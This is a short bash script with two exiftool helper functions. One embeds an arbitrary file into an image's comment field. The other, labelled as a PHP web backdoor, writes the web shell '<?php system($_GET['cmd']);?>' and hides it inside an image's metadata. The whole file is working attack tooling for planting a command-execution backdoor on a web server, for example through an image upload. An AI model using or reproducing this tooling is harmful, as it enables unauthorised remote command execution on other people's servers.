#!/bin/bash

# add file to an image as a comment
function embedd-to-image() {
    exiftool "-comment<=$1" $2
}

# embed php webbackdoor 
function embedd-bd() {
    echo "<?php system(\$_GET['cmd']);?>" > bd
    exiftool "-comment<=bd" $1
    rm bd
}
